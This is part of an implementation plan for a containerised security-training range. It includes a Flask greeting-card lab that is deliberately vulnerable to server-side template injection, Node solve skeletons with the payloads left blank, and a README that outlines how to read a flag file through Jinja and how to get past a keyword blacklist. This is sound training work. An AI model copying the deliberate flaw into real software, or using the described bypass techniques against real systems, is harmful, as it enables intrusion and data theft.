# labs/r04-postcard/app/app.py — Postcard. Start hook: write HVWA_FLAG (or a Divine decoy) to /tmp/postcard/flag.txt,
# then pop HVWA_FLAG from the environment (spec §6). POST /preview renders the operator's message per level
# (templating.render_card). No page renders the flag file. Serves on 0.0.0.0:$HVWA_PORT with Flask's threaded server
# (debug OFF — debug would be its own vulnerability).
import json
import os
import pathlib
from flask import Flask, request, render_template_string
from markupsafe import escape
from templating import render_card

LEVELS = ("acolyte", "templar", "divine")
LEVEL = os.environ.get("HVWA_LEVEL") if os.environ.get("HVWA_LEVEL") in LEVELS else "acolyte"
PORT = int(os.environ.get("HVWA_PORT", "5000"))
HERE = pathlib.Path(__file__).resolve().parent

_flag = os.environ.get("HVWA_FLAG")
os.environ.pop("HVWA_FLAG", None)  # the process must not keep the flag in its environment
flag_dir = pathlib.Path("/tmp/postcard")
flag_dir.mkdir(parents=True, exist_ok=True)
_body = (_flag if (_flag and LEVEL != "divine")
         else "Divine is the secure reference: your message is printed as data, so there is nothing to inject.")
flag_path = flag_dir / "flag.txt"
flag_path.write_text(_body + "\n")
flag_path.chmod(0o444)

CARDS = json.loads((HERE / "seed" / "cards.json").read_text())
STYLE_CLASS = {"Birthday": "birthday", "Thank you": "thanks", "Congratulations": "congrats"}

app = Flask(__name__)

CSS = """
:root{--rose:#e7a6b8;--plum:#6d4466;--cream:#fbf4ef;--ink:#4a3340;--line:#efd9df}
*{box-sizing:border-box}body{margin:0;font:16px/1.6 "Segoe UI",system-ui,sans-serif;color:var(--ink);background:var(--cream)}
header{background:var(--plum);color:#fff;padding:18px 24px}header h1{margin:0;font-size:20px}
main{max-width:720px;margin:26px auto;padding:0 16px}nav a{color:var(--plum);font-weight:600;text-decoration:none;margin-right:16px}
form{background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px;margin:16px 0}
select,textarea{width:100%;padding:10px;border:1px solid var(--line);border-radius:8px;font:inherit;margin:6px 0}
button{background:var(--rose);color:#fff;border:0;border-radius:8px;padding:10px 18px;font-weight:700;cursor:pointer}
.card{background:#fff;border:2px solid var(--rose);border-radius:16px;padding:28px;margin:18px 0;text-align:center}
.card .flourish{color:var(--rose);font-size:28px}.card .msg{font-size:20px;margin:14px 0}.card .sign{color:var(--plum);font-style:italic}
footer{color:#a98ea0;font-size:12px;text-align:center;margin:40px 0 20px}
"""

SHELL = (
    '<!doctype html><html lang="en"><head><meta charset="utf-8">'
    '<meta name="viewport" content="width=device-width, initial-scale=1">'
    "<title>{{ title }} — Postcard</title><style>{{ css }}</style></head><body>"
    '<header><h1>Postcard</h1></header><main>'
    '<nav><a href="/">Make a card</a><a href="/gallery">Gallery</a></nav>{{ inner|safe }}'
    "<footer>Postcard • Handmade cards, printed to order</footer></main></body></html>"
)

def shell(title, inner):
    # The chrome is a CONSTANT template; only `inner` (built per route) is marked safe. User text reaches Jinja only
    # through render_card (the intentional flaw) — never through this shell.
    return render_template_string(SHELL, title=title, css=CSS, inner=inner)

@app.get("/healthz")
def healthz():
    return {"status": "ok"}

@app.get("/")
def index():
    options = "".join(f'<option value="{escape(c["style"])}">{escape(c["style"])}</option>' for c in CARDS)
    inner = (
        "<h2>Make a card</h2>"
        '<form method="post" action="/preview">'
        f"<label>Style<select name=\"style\">{options}</select></label>"
        '<label>Message<textarea name="message" rows="3" placeholder="Write your message"></textarea></label>'
        "<button>Preview</button></form>"
    )
    return shell("Make a card", inner)

@app.post("/preview")
def preview():
    style = request.form.get("style", "Birthday")
    message = request.form.get("message", "")
    card = render_card(LEVEL, STYLE_CLASS.get(style, "birthday"), message)
    return shell("Your card", f"<h2>Your card</h2>{card}")

@app.get("/gallery")
def gallery():
    cards = "".join(f'<div class="card {STYLE_CLASS.get(c["style"],"birthday")}"><div class="flourish">&#10047;</div>'
                    f'<p class="msg">{escape(c["sample"])}</p><div class="sign">— Postcard</div></div>' for c in CARDS)
    return shell("Gallery", f"<h2>Gallery</h2>{cards}")

if __name__ == "__main__":
    print(f"postcard on :{PORT} ({LEVEL})")
    app.run(host="0.0.0.0", port=PORT, threaded=True, debug=False)
```

- [ ] **Step 8: The reference solves (Node; SSTI payload left to the implementer)**

Both solves are Node HTTP clients that POST `style`+`message` to `/preview` and read the flag out of the rendered card. The SSTI expression is an attack payload, so the plan leaves it blank with a precise description; `npm run labs:test -- --lab r04` proves it.

`labs/r04-postcard/solve/acolyte.mjs`:

```js
// Reference solve — Postcard, Acolyte. /preview renders the message as a Jinja2 template. PAYLOAD must be a template
// expression that reaches a Python file-read primitive and prints /tmp/postcard/flag.txt into the card. Implementer-
// supplied; the plan hard-codes no template payload by design.
const base = process.argv[2];
const PAYLOAD = '';   // <- implementer supplies this per the prose (object-graph file read of /tmp/postcard/flag.txt).
const res = await fetch(`${base}/preview`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ style: 'Birthday', message: PAYLOAD }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

`labs/r04-postcard/solve/templar.mjs`:

```js
// Reference solve — Postcard, Templar. The press refuses raw `__` and the words os/popen/import/subprocess/eval/exec,
// then still renders the message as a template. PAYLOAD must perform the same file read while never spelling out a
// blocked token — assemble the attribute names from escapes/pieces so the raw message matches nothing. Implementer-supplied.
const base = process.argv[2];
const PAYLOAD = '';   // <- implementer supplies this per the prose (blacklist-free object-graph file read).
const res = await fetch(`${base}/preview`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ style: 'Birthday', message: PAYLOAD }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
```

- [ ] **Step 9: `README.md`**

`labs/r04-postcard/README.md`:

```markdown
# Postcard (r04) — Server-side template injection (Hard)

Postcard is a greeting-card maker on real Flask/Jinja2. The card preview renders the operator's message. At the lower
levels the message becomes Jinja2 template source (SSTI). The flag is a file (`/tmp/postcard/flag.txt`, in the tmpfs),
written at start from `HVWA_FLAG` and then popped from the environment. No page renders the file; only template code
reading it does. Real template execution is intentional (spec §2); the container is the boundary.

## Vulnerable feature
`POST /preview` — the card renderer (`templating.render_card`). The page chrome is a constant template; only the
message reaches Jinja as source at acolyte/templar.

## Levels
- **Acolyte.** The message is concatenated into the card template and rendered. A template expression that walks
  Python's object graph to `open()` prints the flag file into the card.
- **Templar.** The press refuses a raw `__` or any of `os/popen/import/subprocess/eval/exec`, then still renders. The
  literal Acolyte payload is caught. The same file read works if every blocked token is composed from Jinja string
  escapes / `attr`-style access so the raw message never contains one. This is why Acolyte does not carry up.
- **Divine.** The card is a constant `{{ message }}` template and the message is passed as a bound, autoescaped value,
  never as template source. No flag.

## Reference solves
`solve/acolyte.mjs` and `solve/templar.mjs` are Node HTTP clients; the template payload is left to the implementer.
`npm run labs:test -- --lab r04` proves each works at its level and that the Acolyte payload fails at Templar and Divine.
```

- [ ] **Step 10: Static gate** — `npx vitest run tests/labs-harness.spec.ts`. Now that all four labs exist, the whole spec is green (every lab validates, uniqueness holds, all Dockerfiles pinned). This is the gate Task 1 Steps 5–6 deferred.

- [ ] **Step 11: Black-box gate (Docker)** — `npm run labs:test -- --lab r04` → `labs:test OK`.

- [ ] **Step 12: Commit**

```bash
git add labs/r04-postcard
git commit -m "feat(labs): r04 Postcard — server-side template injection lab (3 levels)"
```

---
## Part 3 — The final gate

### Task 8: Build, test, measure, and pin all four labs

**Files:** none new (this task runs the harness; it fixes the owning task's files if a check fails, and commits the filled-in solve payloads and the regenerated `labs/registry.json`).

- [ ] **Step 1: The static gate (no Docker)**

Run (from `C:\Users\Sahuagin\Documents\hvwa`, capital `C:`): `npx vitest run tests/labs-harness.spec.ts`
Expected: green — all four `lab.json` validate against `labManifestSchema`; app names, scenarios and `themeId`s are unique; every lab has its Dockerfile (pinned base, uid 10001, HEALTHCHECK, setuid strip), `README.md`, `VERSION`, a `.dockerignore` hiding `solve/`, and a solve per exploitable level.

- [ ] **Step 2: Fill in the five attack inputs, then the black-box gate for every lab and level (needs Docker)**

The seven solve scripts ship with a blank attack input each (`r01` acolyte+templar, `r03` acolyte+templar, `r04` acolyte+templar; `r02`'s two solves are already complete). Fill each per its lab's level design, then:

Run: `npm run labs:test`
Expected: for each of the four labs, `PASS` lines for — health passes at all three levels; each exploitable level's reference solve returns exactly that level's flag; each lower-level solve fails against every higher level; Divine resists every solve; browsing the main pages leaks no flag; the lab network has no egress — then `labs:test OK — 4 lab(s) hold (spec §8.5), runtime runc`.

If a lab fails: the printed `FAIL` line and the container logs name the cause. Fix it in that lab's task (the per-level handler in `db.mjs`/`store.mjs`/`diag.mjs`/`templating.py`, or the solve's attack input), rerun `npm run labs:test -- --lab r0N`, then the full run.

- [ ] **Step 3: The uniqueness gate on its own (spec §8.1 release gate)**

Run: `npx vitest run tests/labs-harness.spec.ts -t "uniqueness"`
Expected: green (no duplicate id, slug, app, scenario or themeId across `labs/*/lab.json`).

- [ ] **Step 4: Build the published-tag images and pin them in the registry**

Run: `npm run labs:build`
Expected: four `labs:build sigmajo/hvwa:lab-<slug>-1.0.0 sha256:<id>` lines, then `labs:build wrote …/labs/registry.json (4 lab(s))`. It never pushes.

Confirm the registry is consistent:

Run: `npx vitest run tests/labs-harness.spec.ts -t "registry"`
Expected: green (each entry's id/slug/category matches its lab dir, and each `image` is pinned by a `sha256:` digest).

Note: these `image` values are **local image ids** for this build host — enough for local `npm run labs:test` and Plan A's `npm run range:verify`. Plan E re-pins each lab by its pushed repo digest (`sigmajo/hvwa:lab-<slug>-1.0.0@sha256:…`) after `docker push`, because the warden never pulls and the POC host must already hold the images.

- [ ] **Step 5: The whole project's gates (standalone + platform unchanged)**

Run: `npx vitest run`
Expected: every spec passes, including Plan A's suites and the new `tests/labs-harness.spec.ts`. The lab packages add no runtime code to the HVWA app, so nothing else changes.

Run: `npm run typecheck`
Expected: no output, exit 0. (The `.mjs` runners are type-checked by `tsconfig.test.json`'s `allowJs`; `tests/labs-harness.spec.ts` imports them and `src/lab-registry.ts`.)

- [ ] **Step 6: Measure image size and idle memory (spec §1.5 inputs for Plan E)**

Image sizes:

Run: `docker image ls --filter reference="sigmajo/hvwa:lab-*" --format "{{.Repository}}:{{.Tag}} {{.Size}}"`
Expected: four lines; each Node lab well under ~200 MB, Postcard (Python + Flask) larger but minimal for its base. Record them.

Idle memory per lab (one Acolyte container each, measured, then removed — this is a throwaway measurement outside the test net):

```bash
for lab in r01-mercy-clinic r02-courier r03-beacon r04-postcard; do
  id=$(echo "$lab" | cut -c1-3)
  slug=$(echo "$lab" | cut -c5-)
  img="sigmajo/hvwa:lab-${slug}-1.0.0"
  docker run -d --name hvwa-measure-$id --rm \
    --read-only --tmpfs /tmp:rw,noexec,nosuid,nodev,size=16m \
    --cap-drop ALL --security-opt no-new-privileges:true --user 10001:10001 \
    --memory 256m --memory-swap 256m --pids-limit 128 --cpus 0.5 \
    -e HVWA_LEVEL=acolyte -e HVWA_PORT=$([ "$id" = r04 ] && echo 5000 || echo 8080) \
    -e HVWA_INSTANCE_HOST=i-measure.localhost -e HOME=/tmp -e HVWA_FLAG=HVWA{aaaaaaaaaaaaaaaaaaaaaaaaaa} \
    "$img"
done
sleep 8
docker stats --no-stream --format "table {{.Name}}\t{{.MemUsage}}\t{{.CPUPerc}}" $(docker ps --filter name=hvwa-measure- -q)
for id in r01 r02 r03 r04; do docker rm -f hvwa-measure-$id >/dev/null; done
```

Expected: a `MEM USAGE` figure per lab (tens of MB each; Postcard higher). These feed Plan E's capacity math and `docs/RANGE.md`. (On the POC host, add `--runtime runsc` to each `docker run` to measure under gVisor.)

- [ ] **Step 7: Commit the filled solves and the registry**

```bash
git add labs scripts/lab-harness.mjs scripts/lab-test.mjs scripts/lab-build.mjs tests/labs-harness.spec.ts package.json
git commit -m "feat(labs): complete the 4 POC labs, fill the reference solves, pin labs/registry.json"
```

(Do **not** run `npm run labs:build` with a push step; there is none. Pushing and re-pinning by repo digest is Plan E, done by the controller/owner.)

---

## Self-review

### Spec and brief coverage

| Requirement | Where |
|---|---|
| Manifest validation reuses Plan A's `labManifestSchema` (not redefined) | Task 1 (the Vitest gate imports `src/lab-registry.ts`); the harness `.mjs` does only JSON/structure work |
| Uniqueness gate: no duplicate app / scenario / themeId across `labs/*/lab.json` (spec §8.1) | Task 1 `uniquenessIssues` (+ id, slug), tested; run in Task 8 Step 3 |
| Black-box runner `scripts/lab-test.mjs` over the Docker CLI; per lab and level builds the image, runs with range hardening (read-only, cap_drop ALL, no-new-privileges, internal network, manifest tmpfs, `HVWA_LAB_TEST_RUNTIME` default `runc`) | Task 2 `dockerRunArgs` + `lab-test.mjs` |
| §8.5 checks adapted to 3 levels: health; each exploitable solve gets exactly that flag; same solve fails at every higher level; Divine resists all; main-page browse yields no flag; no egress | Task 2 (checks 1–6) |
| Solve scripts: plain Node `.mjs`, take the base URL, print the flag, in `labs/<id>/solve/`, excluded from the image by `.dockerignore` | Tasks 4–7 (`solve/*.mjs`); `.dockerignore` excludes `solve`; Dockerfiles never `COPY solve` |
| `npm run labs:test` (all, or `--lab <id>`) and `npm run labs:build` building `sigmajo/hvwa:lab-<slug>-<version>`, writing digests into `labs/registry.json`, never pushing | Tasks 2, 3 (scripts + package.json) |
| 4 labs in order: Mercy Clinic (SQLi/Easy/Node+SQLite), Courier (BAC/Easy/Node), Beacon (cmdi/Medium/Node+shell), Postcard (SSTI/Hard/Python) | Tasks 4, 5, 6, 7 |
| Each lab: believable app, own name/purpose/theme/CSS, seeded data, ≥ 3 pages/resources, no in-app guidance | Tasks 4–7 (pages + own CSS + seed + "no endpoint list" notes) |
| Three levels, same flaw in the same feature: Acolyte none, Templar flawed defence, Divine correct fix; with the flaw/defence/why-acolyte-fails/why-divine-safe written out | Tasks 4–7 "The three levels" + README |
| Flag planted from `HVWA_FLAG` then removed from env; Divine has no flag, a decoy; flag file in a declared tmpfs | Tasks 4–7 start hooks; tmpfs in every `lab.json` |
| Flag placement per spec: db row (`db:notices.body`), API record (`custom`), file (`file:/tmp/...`) ×2 | r01/r02/r03/r04 manifests |
| Image: pinned base, non-root, setuid/setgid stripped, `HEALTHCHECK` on the health contract, minimal | Tasks 4–7 Dockerfiles; gate asserts pins/uid/HEALTHCHECK/setuid-strip |
| `lab.json` per Plan A schema; `README.md` author notes; reference solves (prose + HTTP skeleton, payloads left to the implementer) | Tasks 4–7 |
| Hints: 3 per lab, general → specific, in `hints` | Tasks 4–7 manifests |
| Per-level behaviour selected by `HVWA_LEVEL`; one image serves all levels; listens on `$HVWA_PORT` as non-root under read-only rootfs + declared tmpfs | Tasks 4–7 (`level` select; `0.0.0.0:$HVWA_PORT`) |
| Labs never import the HVWA app's `src/`; self-contained under `labs/<id>-<slug>/` | Tasks 4–7 (standard-library/Flask only) |
| Real execution allowed (labs 3, 4 run a real shell / real Jinja2) | Beacon `sh -c`; Postcard `render_template_string` |
| Final task: build all, labs:test, uniqueness gate, update registry, full `vitest` + `typecheck` from uppercase `C:`, print sizes + idle memory | Task 8 |

### Placeholder scan

The only intentional blanks are the five attack-input constants in the r01/r03/r04 solves (r02's two solves are complete). These are deliberate per the brief ("leave out ready-made attack payload strings … the implementer's test must prove it works") and each is accompanied by a precise prose description of the class of input it must be. Task 8 Step 2 is the explicit step that fills them, and `npm run labs:test` is the proof. No `TBD`/`implement later`/"add validation"/"handle edge cases"/empty code steps remain; every other code block is complete and runnable.

### Type and name consistency

- Harness exports used across tasks: `labDirs`, `readManifest`, `labVersion`, `uniquenessIssues`, `newFlag`, `dockerRunArgs`, `LABS_DIR`, `RUNNER_IMAGE`, `LIMITS` (all defined in `scripts/lab-harness.mjs`, Task 1; imported unchanged by `lab-test.mjs` (2), `lab-build.mjs` (3) and `tests/labs-harness.spec.ts` (1)).
- Levels are the literals `acolyte` / `templar` / `divine` everywhere (manifests, `LEVELS` guards in each app, `LEVEL_RANK` in the runner); Divine is always the no-flag, decoy level.
- Flag shape `HVWA{<26×[a-z2-7]>}` matches Plan A's `RANGE_FLAG_RE`; `newFlag()` generates it; every solve and the browse/Divine checks match on `/HVWA\{[a-z2-7]{26}\}/`.
- The warden-set env an instance receives (`HVWA_LEVEL`, `HVWA_PORT`, `HVWA_INSTANCE_HOST`, `HOME`, `HVWA_FLAG` below Divine) is reproduced exactly by `dockerRunArgs`; no lab reads any other platform env and no lab carries its own Traefik labels.
- Manifest field names/types are Plan A's (`flag.placement`, `tmpfs[].path/sizeMiB`, `resources.memoryMiB/pids/cpus`, `hints[].id/cost/text`); `themeId === slug` for all four (unique and kebab).
- Registry entry = manifest + `version` (from `VERSION`) + `image` (`sha256:<id>`), matching `registryEntrySchema` and `IMAGE_REF_RE`'s local-id form; `lab-build.mjs` writes exactly those keys; the gate re-validates with `parseRegistry`.
- `health` is `/healthz` in every manifest and every image's `HEALTHCHECK` probes it; the runner's check 1 reads Docker's `State.Health.Status`, matching Plan A's health contract.

### Conflicts found with Plan A's interfaces, and how they were resolved

1. **Registry `image` for locally-built, unpushed labs.** Plan A's `labs/registry.json` wants each lab `image` pinned by digest, and the warden never pulls. A freshly built image has no repo digest. Resolved by writing the **local image id** `sha256:<64 hex>`, which Plan A's `IMAGE_REF_RE` explicitly accepts ("a local image id"); Plan E re-pins by the pushed repo digest after `docker push`. Called out in Task 3 and Task 8 Step 4.
2. **Lab directory vs lab id.** Plan A fixes ids as `r00`–`r99` and names the fixture dir `labs/_fixture/` (not `labs/r00-fixture`). Catalog labs therefore live at `labs/<id>-<slug>/` with ids `r01`–`r04`; `labDirs()` matches `^r\d{2}-…$` and so skips `_fixture`. No conflict, but it is why the uniqueness/layout gate excludes the fixture.
3. **`flag.placement` for an in-memory API record (Courier).** The placement enum has no "in-memory record" option; `db:` would imply a table. Resolved by using `custom` (a valid enum value) for Courier, with the flag planted on an in-memory parcel record. The harness relies on the solve for that lab (there is no file/db to inspect), which is consistent with `custom`.
4. **Manifest has no `version`, but a registry entry needs one.** Since `labManifestSchema` is `.strict()` and rejects `version`/`image`, the per-lab version cannot live in `lab.json`. Resolved with a `labs/<id>-<slug>/VERSION` file read by `lab-build.mjs` (default `1.0.0`).

### Open risks

- **Bind-mounting the solve directory on Docker Desktop (Windows).** `lab-test.mjs` mounts `labs/<id>/solve` into a runner container. On Docker Desktop the repo drive must be shared with Docker; on the Linux POC host this is a plain bind. If a host disallows bind mounts, an alternative is to `docker cp` the solve into a prepared runner — noted for the implementer.
- **`ping` without `CAP_NET_RAW` (Beacon).** Under the range hardening `ping` may fail; the lab is designed so exfiltration rides on the `echo` status line, not on a successful ping. If a future base image's busybox behaves differently, the `echo`-based design still holds; keep the cosmetic ping `|| true`-guarded.
- **`node:sqlite` is experimental (Mercy Clinic).** It needs `--experimental-sqlite` (set in the Dockerfile CMD) and prints a stderr warning. A future Node 22.x could change the flag or API; pin stays at `node:22.23.5-alpine3.24`, and the harness's health/solve checks catch any regression.
- **MarkupSafe wheel availability (Postcard).** The Flask install assumes musllinux cp313 wheels (no C toolchain). If a pinned version ever lacks a musl wheel, `pip install` would try to compile and fail under the minimal base; the fix is a throwaway build stage with `build-base`, noted in the Dockerfile comment.
- **Templar defences are teaching-grade, not production filters.** Each Templar level is a *realistic but flawed* defence by design (single-pass keyword strip, a missed sibling route, a metacharacter blacklist, a token blacklist). The black-box gate proves the intended bypass works and the Acolyte path does not; it does not prove no *other* bypass exists — acceptable for a training range where Templar is meant to be beatable.
- **Solve robustness vs. the harness `!==` check.** Check 3 (a lower solve must fail at a higher level) asserts the solve does not return the higher level's flag. A solve that errors or prints nothing passes this correctly; a solve written to be too lenient (e.g. echoing input) could regress it. The reference solves print only a matched `HVWA{…}`, which keeps the check sound.

---

*End of plan.*
